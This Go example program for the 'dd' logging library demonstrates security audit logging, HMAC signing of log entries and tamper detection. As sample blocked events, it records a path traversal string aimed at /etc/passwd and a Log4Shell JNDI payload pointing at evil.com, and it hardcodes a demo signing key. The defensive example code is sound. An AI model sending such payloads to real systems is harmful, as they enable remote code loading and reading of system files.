//go:build examples

package main

import (
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/cybergodev/dd"
)

// Audit & Integrity - Security Audit Logging and Log Integrity Verification
//
// Topics covered:
// 1. Audit logger for security events
// 2. Log integrity signing with HMAC
// 3. Signature verification
// 4. Integration patterns
func main() {
	fmt.Println("=== DD Audit & Integrity ===")

	section1AuditLogging()
	section2IntegritySigning()
	section3Verification()

	fmt.Println("\n✅ Audit & Integrity examples completed!")
}

// Section 1: Audit logging for security events
func section1AuditLogging() {
	fmt.Println("1. Audit Logging")
	fmt.Println("-----------------")

	// Create audit logger with default configuration
	// By default, outputs to stderr in JSON format
	cfg := dd.DefaultAuditConfig()
	cfg.Output = os.Stdout // Redirect to stdout for demo
	cfg.JSONFormat = true

	auditLogger := dd.NewAuditLogger(cfg)
	defer auditLogger.Close()

	// Log security events using helper methods
	auditLogger.LogSensitiveDataRedaction(
		"password=*", // pattern
		"password",   // field name
		"Password field was redacted in user input",
	)

	auditLogger.LogPathTraversalAttempt(
		"../../../etc/passwd",
		"Path traversal attempt blocked in file upload",
	)

	auditLogger.LogSecurityViolation(
		"LOG4SHELL",
		"Potential Log4Shell pattern detected",
		map[string]any{
			"input":     "${jndi:ldap://evil.com/a}",
			"source_ip": "192.168.1.100",
		},
	)

	// Allow async processing
	time.Sleep(100 * time.Millisecond)

	// Get audit statistics
	stats := auditLogger.Stats()
	fmt.Printf("\n  Total events: %d\n", stats.TotalEvents)
	fmt.Printf("  By type: %v\n", stats.ByType)

	fmt.Println()
}

// Section 2: Log integrity signing
func section2IntegritySigning() {
	fmt.Println("2. Log Integrity Signing")
	fmt.Println("-------------------------")

	// Create integrity config with a secret key
	// IMPORTANT: In production, use a securely generated key (32+ bytes)
	// and store it securely (e.g., environment variable, secret manager)
	integrityCfg, err := dd.DefaultIntegrityConfigSafe()
	if err != nil {
		fmt.Printf("  Error creating integrity config: %v\n", err)
		return
	}

	// Create signer
	signer, err := dd.NewIntegritySigner(integrityCfg)
	if err != nil {
		fmt.Printf("  Error creating signer: %v\n", err)
		return
	}

	// Sign log messages
	message := "User login successful"
	signature := signer.Sign(message)
	fmt.Printf("  Original: %s\n", message)
	fmt.Printf("  Signature: %s\n", signature)

	// Sign structured log with fields
	fields := []dd.Field{
		dd.String("user_id", "12345"),
		dd.String("action", "login"),
		dd.Time("timestamp", time.Now()),
	}
	signedMessage := signer.SignFields("Audit event", fields)
	fmt.Printf("  Signed with fields: %s\n", signedMessage[:minInt(50, len(signedMessage))]+"...")

	fmt.Println()
}

// Section 3: Signature verification
func section3Verification() {
	fmt.Println("3. Signature Verification")
	fmt.Println("--------------------------")

	// Create signer with known key for verification demo
	secretKey := []byte("demo-secret-key-must-be-32-bytes-long!!")
	integrityCfg := &dd.IntegrityConfig{
		SecretKey:        secretKey,
		HashAlgorithm:    dd.HashAlgorithmSHA256,
		IncludeTimestamp: true,
		IncludeSequence:  true,
		SignaturePrefix:  "[SIG:",
	}

	signer, _ := dd.NewIntegritySigner(integrityCfg)

	// Sign a message
	message := "Critical audit event: admin access granted"
	signedEntry := message + signer.Sign(message)
	fmt.Printf("  Signed entry: %s\n", signedEntry[:minInt(60, len(signedEntry))]+"...")

	// Verify the signature
	result := dd.VerifyAuditEvent(signedEntry, signer)
	if result.Valid {
		fmt.Println("  ✓ Signature is VALID")
		if result.Event != nil {
			fmt.Printf("  Event type: %s\n", result.Event.Type)
		}
	} else {
		fmt.Printf("  ✗ Signature INVALID: %s\n", result.Error)
	}

	// Tampered message detection
	tampered := strings.Replace(signedEntry, "granted", "denied", 1)
	result = dd.VerifyAuditEvent(tampered, signer)
	if !result.Valid {
		fmt.Println("  ✓ Tampering detected correctly")
	}

	fmt.Println()
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
